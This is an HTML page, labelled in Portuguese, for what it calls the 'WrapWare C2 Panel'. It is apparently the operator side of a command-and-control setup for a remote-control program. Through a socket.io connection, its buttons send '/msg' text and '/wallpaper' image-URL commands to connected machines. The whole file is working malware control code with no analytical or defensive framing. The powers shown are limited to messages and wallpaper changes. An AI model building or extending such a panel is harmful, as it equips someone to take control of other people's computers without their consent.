<!DOCTYPE html>
<html>
<head>
    <title>WrapWare Control Panel</title>
    <script src="/socket.io/socket.io.js"></script>
    <style>
        body { font-family: sans-serif; background: #1a1a1a; color: white; padding: 20px; }
        .card { background: #2d2d2d; padding: 20px; border-radius: 8px; margin-bottom: 10px; }
        input { width: 80%; padding: 10px; border-radius: 4px; border: none; }
        button { padding: 10px 20px; cursor: pointer; background: #007bff; color: white; border: none; border-radius: 4px; }
        button:hover { background: #0056b3; }
        .status { color: #00ff00; font-size: 0.8em; }
    </style>
</head>
<body>
    <h1>WrapWare C2 Panel</h1>
    <p class="status" id="status">Conectando...</p>

    <div class="card">
        <h3>Enviar Mensagem (/msg)</h3>
        <input type="text" id="msgInput" placeholder="Digite a mensagem aqui...">
        <button onclick="sendCommand('/msg ' + document.getElementById('msgInput').value)">Enviar</button>
    </div>

    <div class="card">
        <h3>Trocar Wallpaper (/wallpaper)</h3>
        <input type="text" id="wallInput" placeholder="URL da imagem (JPG/BMP)...">
        <button onclick="sendCommand('/wallpaper ' + document.getElementById('wallInput').value)">Aplicar</button>
    </div>

    <script>
        const socket = io();
        const status = document.getElementById('status');

        socket.on('connect', () => { status.innerText = 'Online - ID: ' + socket.id; });
        socket.on('disconnect', () => { status.innerText = 'Offline'; });

        function sendCommand(cmd) {
            console.log('Enviando:', cmd);
            socket.emit('send-command', cmd);
            alert('Comando enviado: ' + cmd);
        }
    </script>
</body>
</html>
